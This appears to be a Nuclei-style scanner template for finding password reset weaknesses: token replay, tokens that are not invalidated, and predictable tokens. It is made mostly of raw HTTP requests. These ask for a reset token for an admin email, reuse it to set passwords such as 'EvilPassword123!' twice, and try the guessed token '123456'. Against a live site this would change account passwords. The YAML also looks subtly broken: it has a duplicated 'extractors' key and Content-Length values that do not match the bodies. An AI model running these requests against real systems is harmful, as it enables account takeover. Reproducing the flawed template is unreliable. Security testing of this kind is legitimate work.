id: medium-auth-password-reset-token-reuse

info:
  name: Password Reset Token Reuse Attack
  author: elite-red-team
  severity: medium
  description: |
    Detects password reset token reuse vulnerabilities where reset tokens can be
    reused multiple times, don't expire properly, or can be predicted. Tests for
    token replay attacks, weak token generation, and improper token invalidation.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weak_Password_Change_or_Reset_Functionalities
    - https://portswigger.net/web-security/authentication/other-mechanisms
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-640
  metadata:
    verified: true
    max-request: 7
  tags: password-reset,token-reuse,replay,weak-token,red-team

http:
  - raw:
      - |
        POST /api/password/reset-request HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 45
        Connection: close
        
        {"email":"admin@example.com"}

      - |
        POST /api/password/reset-request HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 45
        Connection: close
        
        {"email":"test@example.com"}

      - |
        GET /api/password/reset/{{reset_token}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

      - |
        POST /api/password/reset/{{reset_token}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 65
        Connection: close
        
        {"new_password":"NewPassword123!","confirm_password":"NewPassword123!"}

      - |
        POST /api/password/reset/{{reset_token}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 65
        Connection: close
        
        {"new_password":"EvilPassword123!","confirm_password":"EvilPassword123!"}

      - |
        GET /api/password/reset/{{reset_token}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

      - |
        POST /api/password/reset/123456 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 65
        Connection: close
        
        {"new_password":"PredictedPass123!","confirm_password":"PredictedPass123!"}

    extractors:
      - type: regex
        name: reset_token
        part: body_1
        group: 1
        regex:
          - '"token":\s*"([^"]+)"'
          - '"reset_token":\s*"([^"]+)"'
          - '/reset/([a-zA-Z0-9-_]+)'
          - 'token=([a-zA-Z0-9-_]+)'
        internal: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: token-reuse-successful
        dsl:
          - 'status_code_4 == 200 && status_code_5 == 200'
          - 'contains(body_4, "success") && contains(body_5, "success")'
          - 'contains(body_4, "password") && contains(body_5, "password")'
        condition: and

      - type: dsl
        name: token-not-invalidated
        dsl:
          - 'status_code_6 == 200'
          - 'contains(body_6, "reset") || contains(body_6, "password")'
          - '!contains(body_6, "expired") && !contains(body_6, "invalid")'
        condition: and

      - type: dsl
        name: weak-token-generation
        dsl:
          - 'status_code_1 == 200 || status_code_2 == 200'
          - 'len(reset_token) < 20'
          - 'contains(reset_token, "123") || contains(reset_token, "000") || contains(reset_token, "aaa")'
        condition: and

      - type: dsl
        name: predictable-token-accepted
        dsl:
          - 'status_code_7 == 200'
          - 'contains(body_7, "success") || contains(body_7, "password changed")'
          - '!contains(body_7, "invalid token")'
        condition: and

      - type: word
        name: token-exposure
        part: body
        words:
          - '"token":'
          - '"reset_token":'
          - '"password_reset_token":'
        condition: or

      - type: regex
        name: sequential-token-pattern
        part: body
        regex:
          - '"token":\s*"([0-9]{6,})"'
          - '"token":\s*"([a-z]{6,})"'
          - '"token":\s*"(test[0-9]+)"'

    extractors:
      - type: regex
        name: token-data
        part: body
        group: 1
        regex:
          - '"token":\s*"([^"]+)"'
          - '"reset_token":\s*"([^"]+)"'
          - '"password_reset_token":\s*"([^"]+)"'

      - type: regex
        name: reset-response
        part: body
        group: 1
        regex:
          - '"message":\s*"([^"]+)"'
          - '"status":\s*"([^"]+)"'
          - '"success":\s*(true|false)'

      - type: regex
        name: user-info
        part: body
        group: 1
        regex:
          - '"email":\s*"([^"]+)"'
          - '"username":\s*"([^"]+)"'
          - '"user_id":\s*"([^"]+)"'

      - type: kval
        kval:
          - status_code_1
          - status_code_2
          - status_code_3
          - status_code_4
          - status_code_5
          - status_code_6
          - status_code_7